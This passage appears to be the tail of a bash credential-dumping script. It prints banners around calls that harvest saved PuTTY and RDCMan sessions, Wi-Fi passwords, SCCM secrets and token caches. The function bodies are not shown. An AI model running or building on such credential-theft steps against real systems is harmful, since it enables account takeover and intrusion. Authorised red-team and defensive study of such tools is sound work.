echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
dump_putty
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"


#dump_vnc
#dump_mremoteng

echo -e "\n"
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
dump_rdcman
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"

echo -e "\n"
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
dump_wifi_passwords
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"

echo -e "\n"
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
dump_sccm
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"

echo -e "\n"
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
dump_token_cache
echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"

echo -e "\n"
echo -e "${GREEN}[INFO]${RESET} Dumping complete. Logs saved to $LOG_FILE."
